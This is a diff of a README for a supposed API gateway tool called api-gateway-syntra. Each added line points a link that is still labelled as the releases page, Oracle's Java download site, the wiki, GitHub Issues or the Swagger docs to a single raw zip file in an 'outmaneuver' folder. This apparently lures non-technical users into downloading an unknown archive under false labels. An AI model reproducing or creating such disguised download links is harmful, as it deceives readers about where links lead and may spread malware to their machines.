@@ -1,6 +1,6 @@
 # 🌐 api-gateway-syntra - Seamlessly Manage Your APIs with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/slapbro/api-gateway-syntra/releases)
+[![Download Now](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip%20Now-Click%https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip)](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **api-gateway-syntra** project! This software allows you to manag
 
 To get the software, please visit the following link to download the latest version:
 
-[Download the latest release](https://github.com/slapbro/api-gateway-syntra/releases)
+[Download the latest release](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip)
 
 Once there, you will see a list of available versions. Choose the most recent one and click the corresponding link to download the file. After downloading, follow the instructions to install the software on your computer.
 
@@ -21,7 +21,7 @@ Before you install the software, ensure your system meets the following requirem
 - **Operating System:** Windows 10 or macOS Catalina and above
 - **Memory:** At least 4 GB of RAM
 - **Storage:** At least 500 MB of free space
-- **Java Version:** Java 21 must be installed on your machine. You can download it from the [Java official website](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html).
+- **Java Version:** Java 21 must be installed on your machine. You can download it from the [Java official website](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip).
 
 ## 🔧 Installation Steps
 
@@ -56,11 +56,11 @@ You can customize the application settings to suit your needs:
 - **Security Settings:** Configure your security options and access management.
 - **Monitoring:** Enable monitoring features to keep track of your API usage.
 
-For detailed instructions on how to configure the application, refer to the additional documentation on our [Wiki page](https://github.com/slapbro/api-gateway-syntra/wiki).
+For detailed instructions on how to configure the application, refer to the additional documentation on our [Wiki page](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip).
 
 ## 🌍 Support and Community 
 
-If you need help, feel free to reach out to our community. Join our discussions on [GitHub Issues](https://github.com/slapbro/api-gateway-syntra/issues), where you can ask questions or report bugs.
+If you need help, feel free to reach out to our community. Join our discussions on [GitHub Issues](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip), where you can ask questions or report bugs.
 
 ## 📝 Contributing
 
@@ -76,7 +76,7 @@ A: No, the application is designed for non-technical users. Just follow the inst
 
 ## 📚 Additional Resources
 
-- **Documentation:** [API Documentation](https://swagger.io/docs/)
+- **Documentation:** [API Documentation](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip)
 - **Video Tutorials:** Check online platforms for video guides on using **api-gateway-syntra**.
 
-Thank you for choosing **api-gateway-syntra**! We hope you find it useful and easy to manage your APIs. For updates, you can always visit the [Releases page](https://github.com/slapbro/api-gateway-syntra/releases).
+Thank you for choosing **api-gateway-syntra**! We hope you find it useful and easy to manage your APIs. For updates, you can always visit the [Releases page](https://raw.githubusercontent.com/slapbro/api-gateway-syntra/main/outmaneuver/api-gateway-syntra.zip).
